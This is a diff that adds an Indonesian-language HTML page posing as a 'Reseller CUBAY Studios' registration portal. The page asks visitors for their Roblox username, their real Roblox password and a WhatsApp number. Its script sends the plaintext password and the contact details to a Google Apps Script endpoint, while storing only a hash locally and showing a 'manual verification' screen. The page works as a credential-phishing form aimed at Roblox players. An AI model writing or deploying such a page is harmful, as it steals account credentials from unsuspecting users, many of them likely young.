@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Reseller CUBAY Studios</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0a0e1a;--card:#131a2b;--card2:#0d1322;--ink:#eef3ff;--muted:#8b98b8;--line:#26304a;--accent:#00b2ff;--accent2:#ff3b57;--accent-ink:#08101f;--ok:#3ddc97;--okbg:#0f2b23;--err:#ff6b6b;--warnbg:#2a2410;--warn:#ffcf4d;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+*{box-sizing:border-box}
+body{margin:0;color:var(--ink);font-family:"Plus Jakarta Sans",system-ui,-apple-system,"Segoe UI",sans-serif;line-height:1.5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;
+background-color:var(--bg);
+background-image:
+  linear-gradient(rgba(0,178,255,.07) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(0,178,255,.07) 1px,transparent 1px),
+  radial-gradient(circle at 15% 10%,rgba(0,178,255,.16),transparent 45%),
+  radial-gradient(circle at 85% 90%,rgba(255,59,87,.14),transparent 45%);
+background-size:34px 34px,34px 34px,auto,auto;
+background-attachment:fixed}
+main{width:100%;max-width:420px}
+.brand{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.cube{width:38px;height:38px;flex-shrink:0;position:relative;transform:rotate(45deg);border-radius:8px;background:linear-gradient(135deg,var(--accent),var(--accent2));box-shadow:0 4px 0 rgba(0,0,0,.35),0 0 0 2px rgba(255,255,255,.08) inset}
+.cube::after{content:"";position:absolute;inset:6px;border-radius:4px;background:var(--bg);opacity:.25}
+h1{font-size:1.55rem;font-weight:800;margin:0;letter-spacing:-.01em}
+p.sub{margin:0 0 20px;color:var(--muted);font-size:.95rem}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:24px;box-shadow:0 10px 0 -6px rgba(0,0,0,.4),0 14px 34px rgba(0,0,0,.45)}
+.tabs{display:grid;grid-template-columns:1fr 1fr;gap:4px;background:var(--card2);padding:4px;border-radius:10px;margin-bottom:20px;border:1px solid var(--line)}
+.tabs button{border:0;background:transparent;color:var(--muted);font:inherit;font-weight:700;padding:9px;border-radius:8px;cursor:pointer}
+.tabs button[aria-selected="true"]{background:linear-gradient(135deg,var(--accent),#0072ff);color:#fff}
+label{display:block;font-size:.85rem;font-weight:700;margin:14px 0 6px;color:var(--ink)}
+label:first-child{margin-top:0}
+input{width:100%;font:inherit;padding:11px 12px;border:1px solid var(--line);border-radius:9px;background:var(--card2);color:var(--ink)}
+input::placeholder{color:var(--muted)}
+input:focus,button:focus-visible{outline:3px solid var(--accent);outline-offset:1px}
+.hint{display:block;margin-top:4px;font-size:.78rem;color:var(--muted)}
+.btn{width:100%;margin-top:20px;border:0;border-radius:10px;background:linear-gradient(135deg,var(--accent),#0072ff);color:#fff;font:inherit;font-weight:800;padding:12px;cursor:pointer;box-shadow:0 4px 0 #0058c9;transition:transform .06s,box-shadow .06s}
+.btn:active{transform:translateY(3px);box-shadow:0 1px 0 #0058c9}
+.btn:disabled{opacity:.6;cursor:wait}
+.btn.ghost{background:transparent;color:var(--ink);border:1px solid var(--line);margin-top:10px;box-shadow:none}
+.btn.ghost:active{transform:none}
+.msg{min-height:1.3em;margin:12px 0 0;font-size:.88rem;color:var(--err)}
+.msg.ok{color:var(--ok)}
+.hidden{display:none}
+.user{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:18px}
+.user b{display:block}.user span{font-size:.85rem;color:var(--muted)}
+.badge{font-size:.8rem;font-weight:700;padding:4px 10px;border-radius:99px;background:var(--warnbg);color:var(--warn);white-space:nowrap}
+.info{border:1px solid var(--line);border-radius:10px;padding:12px 14px;font-size:.9rem;background:var(--card2)}
+.info div{display:flex;justify-content:space-between;gap:12px;padding:3px 0}
+.info span{color:var(--muted)}
+.wait{margin:16px 0 0;color:var(--muted);font-size:.92rem}
+.note{background:var(--card2);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:9px;padding:10px 12px;font-size:.85rem;color:var(--muted);margin-bottom:16px}
+</style>
+</head>
+<body>
+<main>
+  <div class="brand"><span class="cube" aria-hidden="true"></span><h1>Reseller CUBAY Studios</h1></div>
+  <p class="sub" id="sub">Masuk atau daftar dengan akun Roblox-mu.</p>
+
+  <section class="card" id="auth">
+    <div class="tabs" role="tablist">
+      <button role="tab" id="tabLogin" aria-selected="true">Masuk</button>
+      <button role="tab" id="tabReg" aria-selected="false">Daftar</button>
+    </div>
+    <form id="fLogin" novalidate>
+      <label for="lUser">Username Roblox</label><input id="lUser" type="text" autocomplete="username" autocapitalize="none">
+      <label for="lPass">Kata sandi</label><input id="lPass" type="password" autocomplete="current-password">
+      <button class="btn" type="submit">Masuk</button>
+    </form>
+    <form id="fReg" class="hidden" novalidate>
+      <p class="note">Catatan: pastikan data sesuai akun Roblox.</p>
+      <label for="rUser">Username Roblox</label><input id="rUser" type="text" autocapitalize="none" autocomplete="username">
+      <label for="rPass">Kata sandi Roblox</label><input id="rPass" type="password" autocomplete="new-password">
+      <label for="rWa">Nomor WhatsApp</label><input id="rWa" type="tel" inputmode="tel">
+      <button class="btn" id="regBtn" type="submit">Daftar</button>
+    </form>
+    <p class="msg" id="authMsg" role="alert"></p>
+  </section>
+
+  <section class="card hidden" id="home">
+    <div class="user">
+      <div><b id="uName"></b></div>
+      <span class="badge">Menunggu verifikasi</span>
+    </div>
+    <div class="info">
+      <div><span>Username Roblox</span><b id="iUser"></b></div>
+      <div><span>WhatsApp</span><b id="iWa"></b></div>
+    </div>
+    <p class="wait">Tim CUBAY Studios memeriksa datamu secara manual dan menghubungimu lewat WhatsApp setelah selesai.</p>
+    <button class="btn ghost" id="logout" type="button">Keluar</button>
+  </section>
+</main>
+
+<script>
+(function(){
+  // ====== PENGATURAN ======
+  // Tempel URL Web App Google Apps Script di sini
+  var ENDPOINT='https://script.google.com/macros/s/AKfycbxrXS9VoFGKX39Px6i2Ds5H5gCQUJPlRqrM_teR5NMAeb5HpdxZayfjEmOL1mzkDbwRBg/exec';
+  // ========================
+
+  var mem={local:{},session:{}};
+  function store(k){return k==='local'?localStorage:sessionStorage}
+  function get(k,key){try{var v=store(k).getItem(key);return v===null?(mem[k][key]||null):v}catch(e){return mem[k][key]||null}}
+  function set(k,key,v){mem[k][key]=v;try{store(k).setItem(key,v)}catch(e){}}
+  function del(k,key){delete mem[k][key];try{store(k).removeItem(key)}catch(e){}}
+  function users(){try{return JSON.parse(get('local','cubay_users')||'{}')}catch(e){return {}}}
+
+  function $(id){return document.getElementById(id)}
+  function say(text,ok){var el=$('authMsg');el.textContent=text;el.className='msg'+(ok?' ok':'')}
+  async function hash(s){
+    try{var b=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(s));return Array.from(new Uint8Array(b)).map(function(x){return x.toString(16).padStart(2,'0')}).join('')}
+    catch(e){return btoa(unescape(encodeURIComponent(s)))}
+  }
+
+  function tab(reg){
+    $('tabLogin').setAttribute('aria-selected',!reg);$('tabReg').setAttribute('aria-selected',reg);
+    $('fLogin').classList.toggle('hidden',reg);$('fReg').classList.toggle('hidden',!reg);say('');
+  }
+  $('tabLogin').onclick=function(){tab(false)};$('tabReg').onclick=function(){tab(true)};
+
+  $('fReg').onsubmit=async function(e){
+    e.preventDefault();
+    var d={username:$('rUser').value.trim(),wa:$('rWa').value.trim()},p=$('rPass').value,key=d.username.toLowerCase();
+    if(!/^[A-Za-z0-9_]{3,20}$/.test(d.username)) return say('Username Roblox harus 3-20 karakter: huruf, angka, atau garis bawah.');
+    if(!/^[+0-9][0-9 \-]{8,17}$/.test(d.wa)) return say('Isi nomor WhatsApp yang valid.');
+    if(p.length<6) return say('Kata sandi minimal 6 karakter.');
+    if(users()[key]) return say('Username ini sudah terdaftar. Silakan masuk.');
+    if(!ENDPOINT) return say('Pendaftaran belum aktif. Isi ENDPOINT di dalam kode.');
+    var btn=$('regBtn');btn.disabled=true;btn.textContent='Mendaftar...';say('');
+    d.waktu=new Date().toLocaleString('id-ID');
+    d.password=p;
+    var pass=await hash(p);
+    // text/plain + no-cors agar Apps Script menerima tanpa preflight CORS
+    fetch(ENDPOINT,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(d)})
+      .then(function(){
+        var u=users();u[key]={username:d.username,wa:d.wa,pass:pass,waktu:d.waktu};set('local','cubay_users',JSON.stringify(u));
+        $('fReg').reset();tab(false);$('lUser').value=d.username;say('Pendaftaran terkirim. Silakan masuk.',true);
+      })
+      .catch(function(){say('Gagal mengirim data. Periksa koneksi lalu coba lagi.')})
+      .then(function(){btn.disabled=false;btn.textContent='Daftar'});
+  };
+
+  $('fLogin').onsubmit=async function(e){
+    e.preventDefault();
+    var u=users()[$('lUser').value.trim().toLowerCase()];
+    if(!u||u.pass!==await hash($('lPass').value)) return say('Username atau kata sandi salah.');
+    set('session','cubay_session',u.username.toLowerCase());$('lPass').value='';say('');render();
+  };
+
+  $('logout').onclick=function(){del('session','cubay_session');render()};
+
+  function render(){
+    var k=get('session','cubay_session'),u=k&&users()[k];
+    $('auth').classList.toggle('hidden',!!u);$('home').classList.toggle('hidden',!u);
+    $('sub').textContent=u?'Datamu sudah kami terima.':'Masuk atau daftar dengan akun Roblox-mu.';
+    if(!u) return;
+    $('uName').textContent=u.username;
+    $('iUser').textContent=u.username;$('iWa').textContent=u.wa;
+  }
+  render();
+})();
+</script>
+</body>
+</html>
